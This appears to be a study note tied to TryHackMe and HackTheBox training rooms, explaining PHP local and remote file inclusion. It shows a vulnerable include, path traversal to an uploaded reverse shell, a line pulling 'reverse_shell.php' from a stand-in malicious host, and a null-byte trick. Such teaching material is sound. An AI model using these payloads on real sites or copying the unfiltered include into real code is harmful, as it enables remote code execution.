# File inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-md-2"><div>

Files inclusion refers to websites that are importing a file based or using the user input. This involves using the user input to:

* ğŸš determine configuration files to include
* ğŸŒ determine language files to include
* ...

If the input is not filtered/validated, a hacker may include arbitrary content using [Path traversal](traversal.md) such as an uploaded script.
</div><div>

There are two categories of file inclusion

* **Local File Inclusion (LFI)** ğŸ : include a local file
* **Remote File Inclusion (RFI)** âœˆï¸: include a remote file

Template engines are more likely to contain LFI/RFI. They can lead to code/data exposure, which may further compromise the company.

ğŸ“š Look for headers, forms, etc.
</div></div>

<hr class="sep-both">

## PHP include file inclusion

<div class="row row-cols-md-2"><div>

The website `http://vulnerable.site/?lang=FR` is doing an include using `$_GET["lang"]` as seen below.

```php!
include "lang/$_GET[lang].php"
```

The import is not filtered, we can use [Path traversal](traversal.md) to include a malicious file, such as one we uploaded using another attack.

**Local File Inclusion (LFI)** ğŸ : inject a local file

```php!
// ex: we uploaded a reverse shell (a fake PNG)
// as our avatar (avatar.png), then we could use:
include "lang/../uploads/avatar.png"
```
</div><div>

**Remote File Inclusion (RFI)** âœˆï¸: inject a remote file

```php!
// ğŸ›‘ allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```

**Additional notes**:

* The **null byte `%00`** could be used in **PHP < 5.3.4** to ignore trailing extensions such as `.png` below:

```php!
include "xxx.png%00.php" // include xxx.png
```
</div></div>